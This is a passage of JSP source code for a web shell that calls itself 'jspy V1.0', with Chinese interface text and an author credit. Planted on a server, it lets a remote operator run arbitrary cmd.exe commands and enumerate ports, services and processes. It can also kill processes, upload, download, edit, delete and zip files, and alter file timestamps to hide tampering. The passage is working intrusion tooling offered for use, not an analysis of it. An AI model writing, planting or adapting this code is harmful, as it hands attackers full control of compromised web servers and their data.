			out.print("终端返回信息:&nbsp;&nbsp;&nbsp;&nbsp;"+exeCmd(out,openxpOr2003[i])+"<br>");
		}
	}
	else if(checkOs().equals("windows 2003")){
		for(int i=0;i<openxpOr2003.length;i++){
			out.print("终端返回信息:&nbsp;&nbsp;&nbsp;&nbsp;"+exeCmd(out,openxpOr2003[i])+"<br>");

		}
	}

}

//输出端口-进程-服务框架函数
 public void pgetTcpUdp(JspWriter out,HttpServletRequest request)throws Exception{
	//String nowCom = command;
	out.print("<table align=center width=\"80%\" border=\"0\">");
	out.print("<tr><td width=\"20%\">端口类型</td><td  width=\"30%\">本地IP:端口</td><td width=\"30%\">外部IP:端口</td><td width=\"20%\">端口状态</td></tr>\n");
	getSinfo(out,request.getParameter("command"));
	out.print("</table>");
 } 
 public void pgetServer(JspWriter out,HttpServletRequest request)throws Exception{
	// String nowCom = command;
	out.print("<table align=center width=\"80%\" border=\"0\">");
	out.print("<tr><td width=\"20%\">服务名称</td></tr>\n");
	getSinfo(out,request.getParameter("command"));
	out.print("</table>");
 } 
  public void pgetTask(JspWriter out,HttpServletRequest request)throws Exception{
	 // String nowCom = command;
	out.print("<table align=center width=\"80%\" border=\"0\">");
	out.print("<tr><td width=\"30%\">进程名称</td><td  width=\"30%\">PID号</td><td width=\"30%\">相关服务</td></tr>\n");
	getSinfo(out,request.getParameter("command"));
	out.print("</table>");
 } 
 //读取端口-进程-服务信息函数
 public void getSinfo(JspWriter out,String command) throws Exception{
      //  File file = _file;  
	  int skipline = 0; //跳过读取行数
        try {
			 Process pro = null;
			if(command.equals("netstat")){
				pro = Runtime.getRuntime().exec("cmd.exe /c netstat -an");  
				skipline = 4;
			}
			else if(command.equals("netstart")){
				pro = Runtime.getRuntime().exec("cmd.exe /c net start");  
				skipline = 2;
			}
			else if(command.equals("tasklist")){
				pro = Runtime.getRuntime().exec("cmd.exe /c tasklist /svc");  
				skipline = 3;
			}
           BufferedReader br = new BufferedReader(new InputStreamReader(pro.getInputStream()));  
			//该for循环读取字节流跳过指定行数
            for (int i = 0; i < skipline; i++) {  
                br.readLine();  				
            }  
		String buff = "";  
		while( (buff=br.readLine())!= null){
            out.print("<tr>");
			if(2!=skipline){//读取端口和进程信息
				StringTokenizer st = new StringTokenizer(buff);  
				while(st.hasMoreElements()){
					String Info = st.nextToken();  
					out.print("<td >"+Info+"</td>");
				}
			}
			else{//读取服务信息
				
				while((buff=br.readLine())!=null){					  
					out.print("<tr><td >"+buff+"</td></tr>");
				}
			}
			out.print("</tr>\n");
		}
            br.close();  
           // return buff;  
        } catch (Exception e) {  
           // return null;  
        }  
}  
//结束进程函数
public void pkillProc(JspWriter out) throws Exception{
	out.print("<table width='100%' border='0'>");
	out.print("<form id='form1' name='form1' method='post' action='?action=v'>");
	out.print("<tr><td colspan='3'>结束进程工具 (孤水绕城提示：该工具比较霸道，使用要慎重。)</td></tr>");
	out.print("<tr><td width='12%'>进程PID号</td><td width='28%'><input type='text' name='killpid' /> </td>");
	out.print("<td width='60%'><input type='submit' name='Submit' value='结束进程' /></td> </tr>");
	out.print("</form></table>");
}
public void killProc(JspWriter out,String Pid) throws Exception{
	if(empchk(Pid)){
		String exec = exeCmd(out,"taskkill /f /pid "+Pid);
		out.print("☆孤水绕城☆友情提示:<br><br>"+exec);
	}

}
//注册表操作函数，暂时不提供，期待下一个V1.1版本吧:-) 
public void pregedit(JspWriter out) throws Exception{
	out.print("<p>☆孤水绕城☆友情提示:<br><br>v1.0版本暂不支持注册表编辑功能，期待下一个V1.1版本吧:-) </p>");
}
public void aboutJspy(JspWriter out) throws Exception{
	out.print("&nbsp;&nbsp;&nbsp;&nbsp;很久以前我有一个梦想，希望能像戏子一样灵思舞动衣袖飘飞，可是当再次面对繁华落尽的刹那我才发现其实人生如梦是句P话，梦醒后的人生依旧荒芜。无助的我就像一个犯了错的孩子，在爱与痛的边缘一直的堕落。在无尽的等待中期待伤口的愈合以及灵魂的萌芽。我想许久许久以后当尘埃落定的瞬间我希望你能看到我的苍老。wait for jhy......");
	out.print("<br><br>&nbsp;&nbsp;&nbsp;&nbsp;还有半年就要毕业了，需要拿出点东西来纪念我的大学生涯了，花了一个多月的时间jspy V1.0终于写完了，基本的功能都已经实现了，缺少的功能我会在后续的版本中添加，希望大家能够一直关注jspy，多提宝贵意见o(∩_∩)o...。在这里感谢我最最要好的兄弟yizhigu的帮助还有MIAO哥，土豆大叔，simeon，赤龙，花非花，冰的原点，杨过，随风，小浪哥，酷酷，狼，还有我最最尊敬的Lenk大哥以及LST的众兄弟们，希望LST走的长远。。。");
	out.print("<br><br><div align=left>MADE by 孤水绕城<br>QQ:540410588</div>");
}
%>
<BODY>
<style type="text/css">
 body,td{font-size: 12px;background-color:#000000;color:#00ff00;}
 table{T:expression(this.border='0',this.borderColorLight='white',this.borderColorDark='black')}
 .ta{T:expression(this.border='1',this.borderColorLight='white',this.borderColorDark='black')}
 input,select{font-size: 12px;}
 body{margin-top:0px;margin-bottom:0px;margin-left:0px;margin-right:0px}
 td{white-space:nowrap}
 a{color:white;TEXT-DECORATION:none}
</style>
<STYLE>
.style1{background:beige url(sphere.jpg) no-repeat top center}
.style2{background:ivory url(sphere.jpeg) no-repeat bottom right}
</STYLE>

<%
	String Action=request.getParameter("action");
	char action;
		action=(Action==null?"0":Action).charAt(0);		
	//action = 'M';
	try{
		switch(action){
			case 'A':aboutJspy(out);break;
			case 'E':pExeCmd(out,request);break;
			case 'e':exeCmd(out,request.getParameter("cmd"));break;
			case 'M': mainMenu(out,webSite_Folder,strAbsPath);break;
			case 'L': loginOut(out,nowURI);break;
			case 'S':listFolder(out,encodeChange(request.getParameter("FolderPath")));break;
			case 'F':listRoot(out);
			case 'N':newFolder(out,encodeChange(request.getParameter("FolderPath")));break;
			case 'G':pnewFile(out,"MADE BY 孤水绕城\nQQ:540410588",webSite_Folder+"newFile.txt");break;
			case 'g':newFile(out,encodeChange(request.getParameter("fileName")),request.getParameter("fileContent").getBytes("ISO-8859-1"),request.getParameter("choice"));break;
			case 'H':peditFile(out,request.getParameter("fileName"));break;
			case 'I':reName(out,encodeChange(request.getParameter("sFileName")),encodeChange(request.getParameter("FolderPath")));break;
			case 'J':delName(out,encodeChange(request.getParameter("Filename")));break;
			case 'K':copyName(out,encodeChange(request.getParameter("sFileName")),encodeChange(request.getParameter("FolderPath")));break;
			case 'O':downFile(encodeChange(request.getParameter("Filename")),response);return;
			case 'P':zip(out,encodeChange(request.getParameter("FolderPath")),encodeChange(request.getParameter("sFileName")));break;
			case 'Q':findFile(out,encodeChange(request.getParameter("radiobutton")),encodeChange(request.getParameter("filename")));
			case 'q':pfindFile(out,request);break;
			case 'R':dateChange(encodeChange(request.getParameter("Filename")),encodeChange(request.getParameter("year")),encodeChange(request.getParameter("month")),encodeChange(request.getParameter("day")),out);break;
			case 'T':uploadFile(out,request,convertPath(webSite_Folder));break;
			case 't':pupfile(out,convertPath(webSite_Folder));break;
			case 'U':systemInfo(out,request);break;
			case 'B':pgetTcpUdp(out,request);
			case 'V':pkillProc(out);break;
			case 'v':killProc(out,request.getParameter("killpid"));break;
			case 'x':pregedit(out);break;
			case 'W':openTrem(out,request.getParameter("p1"));break;
			case 'w':popenTerm(out);break;
			case 'Y':pgetTask(out,request);break;
			case 'Z':pgetServer(out,request);break;
			default :
				//listFolder(out,"D:\\Tomcat 5.0\\webapps\\test");break;
				mainForm(out,webSite_Folder);break;
		}
	}catch(Exception e){
		
	}
	

%>
<script language="javascript">
function JshowFolder(path){
	top.document.address.action.value="S";
	top.document.address.FolderPath.value=path;
	top.document.address.submit();

}
function checkUrl(){
	top.document.address.action.value="S";	
	top.document.address.submit();
}
function newFolder(Rpath){
	var folderName = prompt("请输入你要保存的全路径：",Rpath+"newFolder");
	if(confirm("你确定要新建这个目录吗")){
		top.document.address.action.value="N";
		top.document.address.FolderPath.value=folderName;
		top.document.address.submit();
	}
	else
		return;
}
function JsReName(spath,dpath){
	var newFolderName = prompt("请输入移动到目标文件全名称",dpath);
	if(confirm("你确定要移动到目标文件吗!")){
		top.document.address.action.value="I";
		top.document.address.FolderPath.value=newFolderName;
		top.document.address.sFileName.value=spath;
		top.document.address.submit();

	}
	else{
		return;
	}
}
function JsCoypFile(spath,dpath){
	var newFolderName = prompt("请输入复制到目标文件全名称",dpath);
	if(confirm("你确定要复制到目标文件吗!")){
		top.document.address.action.value="K";
		top.document.address.FolderPath.value=newFolderName;
		top.document.address.sFileName.value=spath;
		top.document.address.submit();
	}
	else{
		return;
	}
}
function JsdelName(path){
	if(confirm("你确定要删除目标文件吗!")){
		top.document.address.action.value="J";
		top.document.address.Filename.value=path;
		top.document.address.submit();
	}
}
function downFIle(path){	
		top.document.address.action.value="O";
		top.document.address.Filename.value=path;
		top.document.address.submit();	
}
function zipFile(spath){
	var dfile = prompt("请输入目的地址","c:/windows/temp/down.zip");
	if(confirm("你确定要下载到目的地址吗!")){
		top.document.address.action.value="P";
		top.document.address.FolderPath.value=spath;
		top.document.address.sFileName.value=dfile;
		top.document.address.submit();
	}
	else{
		return;
	}
}
function setDate(file){
        document.write("Change date:<br><form method='post' action='?action=R'>");
        document.write("filename:<input name='Filename' type='text' size=60 readonly value='"+file+"'><br>");
        document.write("Year:<select name='year'>");
        for(i=1970;i<=2050;i++){
            document.write("<option value="+i+">"+i+"</option>");
        }
        document.write("</select>");
        document.write("Month:<select name='month'>");
        for(i=1;i<=12;i++){
            document.write("<option value="+i+">"+i+"</option>");
        }
        document.write("</select>");
        document.write("Day:<select name='day'>");
        for(i=1;i<=31;i++){
            document.write("<option value="+i+">"+i+"</option>");
        }
        document.write("</select>");
        document.write("<input name='Action' type='button' onclick='top.address.action.value=\"R\";this.form.submit();' value='dateChange'>");
        document.write("<input name='cancel' onclick='history.back();' type='button' value='Cancel'>");
    }
	  
</script>

</body>
</html>
